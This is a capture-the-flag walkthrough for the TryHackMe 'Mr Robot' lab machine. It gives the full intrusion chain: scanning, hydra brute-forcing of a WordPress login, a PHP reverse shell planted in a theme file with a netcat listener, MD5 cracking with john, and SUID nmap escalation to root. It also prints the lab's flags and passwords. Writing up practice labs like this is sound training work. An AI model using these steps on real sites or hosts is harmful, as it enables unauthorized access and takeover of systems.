https://tryhackme.com/room/mrrobot

## **Scanning**
>	- Perform `nmap` scan on target machine using these options:
>		- `-sC` for the default script.
>		- `-sV` for the version type of ports.
>		- `-oA` to save the output with 3 standard formats.![](nmap-output.png)
```
nmap -sC -sV -oA scans/initial 10.10.231.179
```
>	- Found port `80`running a website.

## **Examining website**
>	- Use `gobuster` or `dirb` to retrieve all open directories and files.
```
gobuster dir -u http://10.10.231.179 -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -t 100 -q -o scans/dirb-small.txt
```
>	- Found  `/sitemap`, nothing useful.
>	- Found `/intro`, shows a video.
>	- Found `/wp-login`, WordPress login page, *INTERESTING!*
>	- Found `/license`, nothing useful.
>	- Found `/readme`, nothing useful.
>	- Found `http://10.10.231.179/robots`, which shows us 2 files, `fsocity.dic` and `key-1-of-3.txt`.
>	- `curl`ing this returns the *first key*.![](exam_1.png)

## **Looting**
>	- Expanding on `/wp-login` finding, we can use `hydra` to brute-force the login.
>	- Get the `name` of the input field for both the `username` and `password`.
```
hydra -L fsocity.dic -p test 10.10.231.179 http-post-form "/wp-login:log=^USER^&pwd=^PWD^:Invalid username" -t 30

```
>		- `-L` specifies the login usernames file.
>		- `-p` specifies the static password to use.
>		- `http-post-form` for the HTTP form for creds, and afterwards comes the parameters used followed by what to expect a `failed` attempt looks like which appears on the website.
>		- `-t` for threading.![](looting_1.png)
>	- Expand upon the found usernames.
```
hydra -l Elliot -P fsocity.dic 10.10.231.179 http-post-form "/wp-login:log=^USER^&pwd=^PWD^:The password you entered for the username" -t 30
```
>		- `-l` specifies the static username to use.
>		- `-P` specifies the password file.
>	- Hydra takes a lot of time, try reversing the list and removing duplicates.
>	- Alternatives are Burpsuite.
>	- Password found `ER28-0652` for user `Elliot`
## **Reverse Shell**
>	- Found in `/appearance/editor` multiple pages that can be embedded with a reverse shell script.
>	- Used `https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php` inside the `archive.php` file, changing the `IP` to your `VPN IP` and the port to any port that you'll be listening on (`53` used in my case).
## **Listener**
>	- Use `rlwrap nc -lvnp 53` to listen on port `53` waiting for the shell.
>		- `rlwrap` give us some optional auto-completion and other benefits.
>		- `-l` for listening mode for inbound connects.
>		- `-v` for verbose.
>		- `-n` for numeric only IPs no DNS.
>		- `-p` for port number.
>	- Visit `/wp-content/themes/twentyfifteen/archive.php` to trigger the shell.![](listener_1.png)

## **Exploring Machine**
>	- After gaining the shell, used `ls` to view different directories.
>	- Found the *Second Key* in `/home/robot` directory. ![](key2-found.png)
>	- Turns out, no access to view the key.![](key-no-access.png)
>	- `password.raw-md5` seems interesting.

## **John The Ripper**
>	- Using `hash-identifier` we can get the hash type.![](hash-type.png)
>	- Using `john` to crack the hash.
```
john md5-hash --wordlist=../fsocity.dic --format=Raw-MD5
```
>	- The user password is `abcdefghijklmnopqrstuvwxyz`.
## **Upgrading the Shell**
>	- The `su` command can't be run from a terminal that's not *interactive*.
>	- Upgrade the terminal using `python` to spawn a shell of our choice.
```
python -c 'import pty;pty.spawn("/bin/bash")'
```
>	- Then switch to the `robot` user with `su robot` and use the password found.![](robot-user.png)
>	- The *Second Key* can then be accessed, the value is `822c73956184f694993bede3eb39f959`

## **Privilege Escalation**
>	- Searching for file that has `SUID` bit set using `find / -perm -u=s -type f 2>/dev/null`
>		- `SUID` sets you as a `root` user or another user when you're running the command.![](suid.png)
>	- Searching in `https://gtfobins.github.io/` with the commands for `sudo` to gain a root shell.
>	- `nmap` is the command to be used.
```
nmap --interactive
!sh
```
>	![](root-user.png)
>	- *Third Key* found, with value `04787ddef27c3dee1ee161b21670b4e4`.![](key3-found.png)
